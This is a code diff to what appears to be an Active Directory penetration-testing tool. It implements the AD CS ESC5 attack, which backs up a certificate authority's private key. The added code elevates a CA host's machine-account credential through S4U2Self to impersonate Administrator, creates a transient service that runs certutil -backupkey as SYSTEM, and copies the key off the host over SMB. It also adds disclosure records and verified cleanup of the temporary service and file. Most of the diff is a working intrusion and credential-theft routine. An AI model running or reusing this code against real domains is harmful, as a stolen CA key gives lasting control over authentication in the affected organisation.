@@ -29,9 +29,10 @@ from __future__ import annotations
 import asyncio
 import secrets
 import urllib.parse
-from dataclasses import dataclass
+from contextlib import AsyncExitStack
+from dataclasses import dataclass, replace
 from pathlib import Path
-from typing import Optional
+from typing import Any, Optional
 
 from adscan_internal import telemetry
 from adscan_internal.services.kerberos_tcp_target import resolve_kerberos_tcp_target
@@ -85,12 +86,24 @@ class CABackupConfig:
     username: str
     password: Optional[str] = None
     nt_hash: Optional[str] = None
+    aes_key: Optional[str] = None
     kdc_ip: Optional[str] = None
     target_fqdn: Optional[str] = None
     service_name: Optional[str] = None
     temp_dir: str = _DEFAULT_TEMP_DIR
     timeout_s: int = 60
     ip_hostname_inventory: Optional[dict[str, list[str]]] = None
+    # Path to a .ccache holding a ready-to-use TGS/TGT for the CA host. When set
+    # it takes precedence over password/nt_hash and drives a
+    # ``smb+kerberos-ccache`` bind. Populated automatically by the S4U2Self
+    # machine-account elevation (see ``ca_backup_native``); a caller may also set
+    # it directly to bind with an explicit ticket.
+    ccache_path: Optional[str] = None
+    # Domain Admin (or other local admin) to impersonate when the credential is
+    # the CA host's own machine account and must be elevated via S4U2Self. When
+    # None the elevation defaults to ``Administrator`` (RID 500), a local admin
+    # on every domain-joined host.
+    impersonate_target: Optional[str] = None
 
     def __post_init__(self) -> None:
         # Auto-route an NT hash that landed in the password field. See
@@ -146,14 +159,21 @@ def _build_smb_url(config: CABackupConfig) -> str:
     ``KDC_ERR_S_PRINCIPAL_UNKNOWN`` against the realm.  ``dc=`` carries the
     KDC IP for AS-REQ routing.
     """
-    if config.password:
+    if config.ccache_path:
+        # An elevated (S4U2Self) or explicitly-supplied ticket wins over any
+        # raw secret — the ccache principal is the one that owns local admin.
+        scheme = "smb+kerberos-ccache"
+        secret = _q(config.ccache_path)
+    elif config.password:
         scheme = "smb+kerberos-password"
         secret = _q(config.password)
     elif config.nt_hash:
         scheme = "smb+kerberos-nt"
         secret = _q(config.nt_hash)
     else:
-        raise ValueError("CABackupConfig must supply either password or nt_hash")
+        raise ValueError(
+            "CABackupConfig must supply a ccache_path, password or nt_hash"
+        )
 
     domain_q = _q(config.domain.upper())
     user_q = _q(config.username)
@@ -305,8 +325,8 @@ async def _wait_for_pfx_on_share(
     )
     last_err: Optional[Exception] = None
     while asyncio.get_event_loop().time() < deadline:
+        file_obj = SMBFile.from_uncpath(unc)
         try:
-            file_obj = SMBFile.from_uncpath(unc)
             chunks: list[bytes] = []
             async for chunk, err in machine.get_file_data(file_obj):
                 if err is not None:
@@ -319,6 +339,16 @@ async def _wait_for_pfx_on_share(
                 return data
         except Exception as exc:  # noqa: BLE001
             last_err = exc
+        finally:
+            # CRITICAL: get_file_data opens the file but never closes it. Leaving
+            # the read handle open (without FILE_SHARE_DELETE) on this connection
+            # makes the later cleanup delete fail with a sharing violation until
+            # the connection is torn down — which is exactly how the temp CA key
+            # file was surviving on the CA host. Close it after every attempt.
+            try:
+                await file_obj.close()
+            except Exception:  # noqa: BLE001
+                pass
         await asyncio.sleep(1.0)
     if last_err is not None:
         print_info_verbose(
@@ -389,8 +419,130 @@ def _validate_recovered_pfx(
 # ---------------------------------------------------------------------------
 
 
-async def ca_backup_native(config: CABackupConfig, output_dir: Path) -> CABackupResult:
+async def _elevate_ca_backup_config_if_machine_account(
+    config: CABackupConfig,
+    stack: "AsyncExitStack",
+) -> CABackupConfig:
+    """Elevate a CA-host machine-account credential to a local-admin ccache.
+
+    CA private-key backup runs ``certutil -backupkey`` as SYSTEM through a
+    transient service, which requires ``SC_MANAGER_CREATE_SERVICE`` — i.e. local
+    admin on the CA host. A domain **computer account** authenticating over the
+    network is NOT a member of the host's local Administrators group, so the
+    machine-account credential alone dead-ends at ``OpenSCManager`` with
+    ``rpc_s_access_denied`` even though Kerberos auth itself succeeds.
+
+    When the credential IS the CA host's own machine account, transparently
+    elevate via **S4U2Self**: mint a self-service ticket to ``cifs/<ca-host>``
+    impersonating a Domain Admin (``Administrator`` by default, or
+    ``config.impersonate_target``) — the exact primitive the credential-dump
+    path uses (:mod:`machine_account_elevation`). The impersonated principal is a
+    local admin on the CA host, so the SCM bind then carries the rights the
+    backup needs.
+
+    Any non-machine-account credential (a real local-admin password, an explicit
+    ccache) is returned unchanged. Elevation is best-effort: on any failure the
+    original machine-account config is returned so the caller still surfaces the
+    honest ``access_denied`` rather than a masked error.
+    """
+    if config.ccache_path:
+        # Caller already supplied a ready ticket — respect it, no elevation.
+        return config
+
+    from adscan_internal.services.exploitation.machine_account_elevation import (
+        elevated_smb_config,
+        is_dc_machine_account,
+    )
+
+    spn_host = config.target_fqdn or config.target_host
+    if not is_dc_machine_account(config.username, spn_host):
+        return config
+    if not (config.nt_hash or config.aes_key):
+        # No re-mintable secret to drive S4U2Self with.
+        return config
+
+    from adscan_internal.services.smb_transport import SMBConfig
+
+    smb_cfg = SMBConfig(
+        target_ip=config.target_host,
+        target_hostname=spn_host,
+        domain=config.domain,
+        username=config.username,
+        nt_hash=config.nt_hash,
+        aes_key=config.aes_key,
+        kdc_ip=config.kdc_ip,
+        use_kerberos=True,
+    )
+    elevated = await stack.enter_async_context(
+        elevated_smb_config(smb_cfg, target_user=config.impersonate_target)
+    )
+    if not elevated.ccache_path:
+        # Elevation did not fire (not a machine account) or fell back on failure.
+        return config
+    return replace(
+        config,
+        username=elevated.username or config.username,
+        ccache_path=elevated.ccache_path,
+        nt_hash=None,
+        aes_key=None,
+        password=None,
+    )
+
+
+async def ca_backup_native(
+    config: CABackupConfig,
+    output_dir: Path,
+    *,
+    shell: Any = None,
+    domain: Optional[str] = None,
+    technique: str = "AD CS ESC5 — CA private-key backup",
+) -> CABackupResult:
+    """Public CA-backup entry point — S4U2Self-elevates then delegates.
+
+    When ``config`` carries the CA host's own machine-account credential (the
+    common case for ESC5, where the CA-host machine hash is recovered from an
+    LSA/SAM dump), this wrapper transparently elevates it to a local-admin ccache
+    via S4U2Self before running the backup — see
+    :func:`_elevate_ca_backup_config_if_machine_account`. The elevated ccache
+    lives for exactly the duration of the backup and is cleaned up on exit. All
+    other credentials pass through unchanged. The operational model lives in
+    :func:`_ca_backup_native_impl`.
+    """
+    async with AsyncExitStack() as stack:
+        config = await _elevate_ca_backup_config_if_machine_account(config, stack)
+        return await _ca_backup_native_impl(
+            config,
+            output_dir,
+            shell=shell,
+            domain=domain,
+            technique=technique,
+        )
+
+
+async def _ca_backup_native_impl(
+    config: CABackupConfig,
+    output_dir: Path,
+    *,
+    shell: Any = None,
+    domain: Optional[str] = None,
+    technique: str = "AD CS ESC5 — CA private-key backup",
+) -> CABackupResult:
     """Backup the CA private key + cert via the service-creation strategy.
+
+    Environment-change disclosure (AD CS ESC5): when ``shell`` carries an
+    ``environment_change_ledger``, the transient service and the temporary key
+    file are registered write-ahead (before the service is created), and the
+    exfiltrated CA private key is disclosed on success. The service/file records
+    resolve to reverted-confirmed only on a verified delete, otherwise
+    ``manual_required`` — a survived artifact on the CA host is always disclosed.
+    Disclosure lives here in the primitive so every caller inherits it.
+
+    Args:
+        config: CA backup inputs (host, realm, credential).
+        output_dir: Where the recovered CA PFX is written.
+        shell: Optional session shell carrying ``environment_change_ledger``.
+        domain: Ledger domain for the disclosure (defaults to ``config.domain``).
+        technique: Ledger ``method`` recorded on each disclosure record.
 
     Operational model:
       1. Open an SMB connection authenticated as ``config.username``.
@@ -410,18 +562,26 @@ async def ca_backup_native(config: CABackupConfig, output_dir: Path) -> CABackup
     Returns a :class:`CABackupResult` with the recovered PFX path and CA
     metadata, or a populated ``error`` field on any failure.
     """
+    from adscan_internal.services.adcs import esc_cleanup as _esc_cleanup
+
     run_id = secrets.token_hex(4)
     service_name = config.service_name or f"ADscan_{run_id}"
     bin_path, unc_subpath = _build_backup_cmd(
         config.temp_dir, run_id, _TEMP_PFX_PASSWORD
     )
     cleanup_cmd = _build_cleanup_cmd(config.temp_dir, run_id)
+    ledger_domain = domain or config.domain
+    # The on-host path the client's sysadmin acts on (C:\... form, not the UNC).
+    remote_pfx_path = f"{config.temp_dir}\\adscan_{run_id}.pfx"
 
     _render_preflight(config, service_name, config.temp_dir)
 
     conn = None
     scm = None
     service_created = False
+    service_change_id: Optional[str] = None
+    pfx_change_id: Optional[str] = None
+    pfx_observed = False
     try:
         try:
             conn, scm = await _open_smb_and_scm(config)
@@ -434,6 +594,25 @@ async def ca_backup_native(config: CABackupConfig, output_dir: Path) -> CABackup
             )
             _render_result(result)
             return result
+
+        # --- Disclose the transient artifacts write-ahead ------------------
+        # Registered BEFORE create_service so a session killed mid-creation
+        # still leaves a record; they are resolved (reverted/manual) in the
+        # finally after a verified delete.
+        service_change_id = _esc_cleanup.register_ca_backup_service(
+            shell,
+            domain=ledger_domain,
+            technique=technique,
+            service_name=service_name,
+            ca_host=config.target_host,
+        )
+        pfx_change_id = _esc_cleanup.register_ca_backup_temp_pfx(
+            shell,
+            domain=ledger_domain,
+            technique=technique,
+            unc_path=remote_pfx_path,
+            ca_host=config.target_host,
+        )
 
         # --- Create service ------------------------------------------------
         print_info_verbose(
@@ -482,6 +661,10 @@ async def ca_backup_native(config: CABackupConfig, output_dir: Path) -> CABackup
             _render_result(result)
             return result
 
+        # The temp PFX was observed on the CA host — its disclosure record now
+        # tracks a file that really exists (resolved in the finally).
+        pfx_observed = True
+
         # --- Validate + repackage ----------------------------------------
         key, cert, err_str = _validate_recovered_pfx(pfx_bytes, _TEMP_PFX_PASSWORD)
         if err_str:
@@ -527,6 +710,20 @@ async def ca_backup_native(config: CABackupConfig, output_dir: Path) -> CABackup
             )
         )
 
+        # Disclose the exfiltrated CA private key — a permanent CA compromise
+        # with no per-object revert, so this is always a manual cleanup item.
+        _esc_cleanup.register_ca_private_key_exfiltrated(
+            shell,
+            domain=ledger_domain,
+            technique=technique,
+            ca_subject=ca_subject,
+            ca_name=str(cn) if cn else None,
+            ca_host=config.target_host,
+            is_root_ca=is_root,
+            key_size_bits=getattr(key, "key_size", None),
+            pfx_path=str(pfx_path),
+        )
+
         result = CABackupResult(
             success=True,
             pfx_path=pfx_path,
@@ -544,30 +741,38 @@ async def ca_backup_native(config: CABackupConfig, output_dir: Path) -> CABackup
         _render_result(result)
         return result
     finally:
-        # ----- Cleanup: always run, in this order: temp files → service ----
-        # 1. Try to remove the temp PFX/dir via SMB directly first.  Cleaner
-        #    than running another service start because it's silent on EID 4688.
-        if conn is not None:
-            try:
-                await _smb_delete_path(conn, "C$", unc_subpath)
-            except Exception:  # noqa: BLE001
-                pass
-        # 2. Even if SMB delete failed (e.g. file held by certutil briefly),
-        #    repurpose the service to run a robust delete + rmdir, then nuke
-        #    the service.
+        # ----- Cleanup: remove BOTH transient artifacts, then VERIFY ------
+        # The service and the temp PFX are genuinely reversible, so we actively
+        # remove them (with retries, since certutil can briefly hold the file)
+        # and re-read to confirm. Only a verified removal marks the ledger
+        # reverted-confirmed; a survived or unconfirmable artifact lands as
+        # manual_required. Cleanup never raises into the caller — a failed
+        # cleanup must not fail the exploit or the scan; the ledger carries the
+        # truth either way. Order: PFX first (it may need the service to delete
+        # it), then the service.
+        pfx_gone = await _remove_temp_pfx_verified(
+            conn, scm, service_name, service_created, unc_subpath, cleanup_cmd
+        )
+        service_gone: Optional[bool] = None
         if scm is not None and service_created:
-            try:
-                await _scm_change_binpath(scm, service_name, cleanup_cmd)
-                try:
-                    await scm.start_service(service_name)
-                except Exception:  # noqa: BLE001
-                    pass
-            except Exception:  # noqa: BLE001
-                pass
-            try:
-                await scm.delete_service(service_name)
-            except Exception:  # noqa: BLE001
-                pass
+            service_gone = await _remove_service_verified(scm, service_name)
+        # Resolve the write-ahead disclosure records honestly.
+        _esc_cleanup.resolve_ca_backup_service(
+            shell,
+            service_change_id,
+            created=service_created,
+            verified_gone=service_gone,
+            service_name=service_name,
+            ca_host=config.target_host,
+        )
+        _esc_cleanup.resolve_ca_backup_temp_pfx(
+            shell,
+            pfx_change_id,
+            observed=pfx_observed,
+            gone=pfx_gone,
+            unc_path=remote_pfx_path,
+        )
+        # Tear down.
         if conn is not None:
             try:
                 await conn.disconnect()
@@ -584,6 +789,165 @@ async def _smb_delete_path(conn, share: str, unc_subpath: str) -> None:
     # TypeError on every call, leaving the temp PFX on the CA host.
     unc = f"\\\\{conn.target.get_hostname_or_ip()}\\{share}\\{unc_subpath}"
     await SMBFile.delete_unc(conn, unc)
+
+
+_NOT_FOUND_MARKERS = (
+    "NOT_FOUND",
+    "NO_SUCH_FILE",
+    "OBJECT_NAME_NOT_FOUND",
+    "OBJECT_PATH_NOT_FOUND",
+)
+
+
+async def _smb_path_gone(conn, share: str, unc_subpath: str) -> Optional[bool]:
+    """Verify the temp PFX's absence on the share after cleanup.
+
+    Returns ``True`` when the file is provably gone (a not-found error opening
+    it), ``False`` when it is still present (a read chunk came back), and
+    ``None`` when absence could not be confirmed (an ambiguous error or a dead
+    connection). We NEVER report a CA key file as gone from an ambiguous error —
+    ``None`` routes the disclosure to ``manual_required``.
+    """
+    from aiosmb.commons.interfaces.file import SMBFile
+    from aiosmb.commons.interfaces.machine import SMBMachine
+
+    unc = f"\\\\{conn.target.get_hostname_or_ip()}\\{share}\\{unc_subpath}"
+    try:
+        machine = SMBMachine(conn)
+        file_obj = SMBFile.from_uncpath(unc)
+        async for chunk, err in machine.get_file_data(file_obj):
+            if err is not None:
+                msg = str(err).upper()
+                if any(marker in msg for marker in _NOT_FOUND_MARKERS):
+                    return True
+                return None
+            # A chunk (even None end-marker) means the open succeeded: present.
+            return False
+        return False
+    except Exception as exc:  # noqa: BLE001
+        msg = str(exc).upper()
+        if any(marker in msg for marker in _NOT_FOUND_MARKERS):
+            return True
+        return None
+
+
+async def _smb_dir_gone(conn, share: str, dir_subpath: str) -> Optional[bool]:
+    """Verify the temp working directory's absence.  Returns True/False/None.
+
+    ``True`` when a listing of the directory returns not-found, ``False`` when it
+    lists (still present), ``None`` when absence could not be confirmed.
+    """
+    from aiosmb.commons.interfaces.directory import SMBDirectory
+
+    unc = f"\\\\{conn.target.get_hostname_or_ip()}\\{share}\\{dir_subpath}"
+    try:
+        directory = SMBDirectory.from_uncpath(unc)
+        _, err = await directory.list(conn)
+        if err is not None:
+            msg = str(err).upper()
+            if any(marker in msg for marker in _NOT_FOUND_MARKERS):
+                return True
+            return None
+        return False
+    except Exception as exc:  # noqa: BLE001
+        msg = str(exc).upper()
+        if any(marker in msg for marker in _NOT_FOUND_MARKERS):
+            return True
+        return None
+
+
+async def _remove_temp_pfx_verified(
+    conn,
+    scm,
+    service_name: str,
+    service_created: bool,
+    unc_subpath: str,
+    cleanup_cmd: str,
+) -> Optional[bool]:
+    """Delete the temp key file AND its working directory, then VERIFY.
+
+    The backup writes both ``adscan_<id>.pfx`` (the moved private key) and the
+    working directory ``adscan_<id>\\`` (certutil's ``.crt`` collateral) under
+    ``C:\\Windows\\Tasks``. We first delete the sensitive ``.pfx`` silently over
+    SMB (retrying, since certutil can briefly hold it), then run the
+    service-driven ``del`` + recursive ``rmdir`` to clear the working directory
+    a plain SMB delete cannot remove while it is non-empty. Returns ``True`` only
+    when BOTH the file and the directory are verified gone; ``False`` when either
+    is still present; ``None`` when the verification could not run.
+    """
+    if conn is None:
+        return None
+    dir_subpath = unc_subpath[:-4] if unc_subpath.lower().endswith(".pfx") else None
+
+    # Fast, silent path for the sensitive key file.
+    for _ in range(2):
+        try:
+            await _smb_delete_path(conn, "C$", unc_subpath)
+        except Exception:  # noqa: BLE001
+            pass
+        if await _smb_path_gone(conn, "C$", unc_subpath) is True:
+            break
+        await asyncio.sleep(1.0)
+
+    # If the file or the working directory still remain, run the service-driven
+    # cleanup (``del /f /q <pfx>`` + ``rmdir /s /q <dir>``) which removes the
+    # non-empty directory recursively on the host.
+    pfx_gone = await _smb_path_gone(conn, "C$", unc_subpath)
+    dir_gone: Optional[bool] = True
+    if dir_subpath:
+        dir_gone = await _smb_dir_gone(conn, "C$", dir_subpath)
+    if (pfx_gone is not True or dir_gone is not True) and scm is not None and service_created:
+        try:
+            await _scm_change_binpath(scm, service_name, cleanup_cmd)
+            try:
+                await scm.start_service(service_name)
+            except Exception:  # noqa: BLE001
+                pass
+        except Exception:  # noqa: BLE001
+            pass
+        await asyncio.sleep(1.5)
+        pfx_gone = await _smb_path_gone(conn, "C$", unc_subpath)
+        if dir_subpath:
+            dir_gone = await _smb_dir_gone(conn, "C$", dir_subpath)
+
+    if pfx_gone is True and dir_gone is True:
+        return True
+    if pfx_gone is False or dir_gone is False:
+        return False
+    return None
+
+
+async def _remove_service_verified(scm, service_name: str) -> Optional[bool]:
+    """Delete the transient service and VERIFY its absence.  True/False/None.
+
+    ``DeleteService`` only MARKS the service for deletion; the record is removed
+    when the last open handle closes. So we delete, close our create handle, and
+    re-open — a not-found on re-open is the genuine confirmation the service is
+    gone. Returns ``True`` when verified absent, ``False`` when it still opens,
+    ``None`` when the verification itself could not run.
+    """
+    try:
+        await scm.delete_service(service_name)
+    except Exception:  # noqa: BLE001
+        pass
+    # Close our create handle so the pending deletion completes.
+    try:
+        await scm.close_service(service_name)
+    except Exception:  # noqa: BLE001
+        pass
+    # Re-open to verify: not-found means the service is genuinely gone.
+    try:
+        reopen_ok, reopen_err = await scm.open_service(service_name)
+    except Exception:  # noqa: BLE001
+        return None
+    if reopen_err is not None:
+        return True
+    # Still openable — the service survived. Close the handle we just opened.
+    try:
+        await scm.close_service(service_name)
+    except Exception:  # noqa: BLE001
+        pass
+    return False
 
 
 async def _scm_change_binpath(scm, service_name: str, new_bin_path: str) -> None:
